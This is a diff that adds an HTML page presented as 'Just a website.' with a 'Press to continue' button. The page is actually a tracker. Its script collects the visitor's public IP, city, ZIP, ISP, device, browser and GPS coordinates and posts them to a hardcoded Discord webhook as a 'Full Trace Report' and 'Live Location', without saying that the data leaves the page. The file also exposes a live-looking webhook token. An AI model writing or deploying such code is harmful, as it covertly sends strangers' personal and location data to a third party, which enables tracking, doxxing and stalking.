@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Just a website.</title>
+  <style>
+    body {
+      margin: 0;
+      background: #0e0e0e url('https://pin.it/3gySQqBl1') no-repeat center center fixed;
+      background-size: cover;
+      color: #f1f1f1;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    #startBtn {
+      padding: 1em 2em;
+      background: crimson;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-size: 1.2em;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+      backdrop-filter: blur(5px);
+    }
+
+    .fade-out {
+      opacity: 0;
+      transform: scale(0.9);
+      pointer-events: none;
+    }
+
+    .line {
+      opacity: 0;
+      transform: translateY(-10px);
+      transition: all 0.2s ease-out;
+      margin: 6px 0;
+      font-size: 1.2em;
+      background: rgba(0,0,0,0.5);
+      padding: 8px 16px;
+      border-radius: 8px;
+    }
+
+    .line.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    #output {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <button id="startBtn" onclick="init()">Press to continue</button>
+  <div id="output"></div>
+
+  <script>
+    const output = document.getElementById("output");
+    const webhook = "https://discord.com/api/webhooks/1397213576615170109/vQ1Vg2t10dDkHK46w3b5dpxY2tOGIs-wKuGGeMRRSCJweEmVbU9v0c_zgRt78BCaW1xL"; // 🔁 Replace with working webhook
+
+    async function init() {
+      document.getElementById("startBtn").classList.add("fade-out");
+
+      const data = {
+        publicIP: "N/A",
+        location: {},
+        localIPs: [],
+        geolocation: {},
+        browser: navigator.userAgent,
+        device: "N/A"
+      };
+
+      // Browser & OS parsing
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+
+      if (navigator.userAgentData) {
+        data.device = navigator.userAgentData.platform || "N/A";
+        const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
+        data.browser = brands;
+      } else {
+        data.device = platform;
+      }
+
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        data.publicIP = ipData.ip || "N/A";
+        data.location = {
+          city: ipData.city || "N/A",
+          region: ipData.region || "N/A",
+          country: ipData.country_name || "N/A",
+          zip: ipData.postal || "N/A",
+          isp: ipData.org || "N/A"
+        };
+      } catch (e) {
+        console.warn("IP API failed");
+      }
+
+      const lines = [
+        `This is your public IP: ${data.publicIP}`,
+        `Is this your city: ${data.location.city}`,
+        `Is this your region: ${data.location.region}`,
+        `Is this your country: ${data.location.country}`,
+        `Your ZIP code: ${data.location.zip}`,
+        `Your ISP: ${data.location.isp}`,
+        `Your device: ${data.device}`,
+        `Your browser: ${data.browser}`
+      ];
+
+      lines.forEach((text, i) => {
+        setTimeout(() => {
+          const el = document.createElement("div");
+          el.className = "line";
+          el.innerText = text;
+          output.appendChild(el);
+          setTimeout(() => el.classList.add("visible"), 100);
+        }, i * 200);
+      });
+
+      const payload = {
+        content: "**📡 Extended User Snapshot**",
+        embeds: [{
+          title: "🧠 Full Trace Report",
+          color: 0x33ccff,
+          fields: [
+            { name: "Public IP", value: data.publicIP },
+            { name: "City", value: data.location.city },
+            { name: "Region", value: data.location.region },
+            { name: "Country", value: data.location.country },
+            { name: "ZIP", value: data.location.zip },
+            { name: "ISP", value: data.location.isp },
+            { name: "Device", value: data.device },
+            { name: "Browser", value: data.browser }
+          ]
+        }]
+      };
+
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error("Webhook failed", err));
+
+      // Geolocation
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+
+          const geoLines = [
+            `Latitude: ${lat}`,
+            `Longitude: ${lon}`,
+            `Accuracy: ±${Math.floor(acc)} meters`,
+            `📍 View on map: https://www.google.com/maps?q=${lat},${lon}`
+          ];
+
+          geoLines.forEach((text, i) => {
+            setTimeout(() => {
+              const el = document.createElement("div");
+              el.className = "line";
+              el.innerText = text;
+              output.appendChild(el);
+              setTimeout(() => el.classList.add("visible"), 50);
+            }, 1500 + i * 200);
+          });
+
+          // Webhook geolocation update
+          const geoPayload = {
+            content: "**📍 GPS Coordinates**",
+            embeds: [{
+              title: "Live Location",
+              color: 0x00ff66,
+              fields: [
+                { name: "Latitude", value: lat.toString() },
+                { name: "Longitude", value: lon.toString() },
+                { name: "Accuracy", value: `±${Math.floor(acc)} meters` },
+                { name: "Google Maps", value: `[📍 View](https://www.google.com/maps?q=${lat},${lon})` }
+              ]
+            }]
+          };
+
+          fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(geoPayload)
+          }).catch(err => console.error("Webhook (geo) failed", err));
+        });
+      }
+    }
+  </script>
+</body>
+</html>
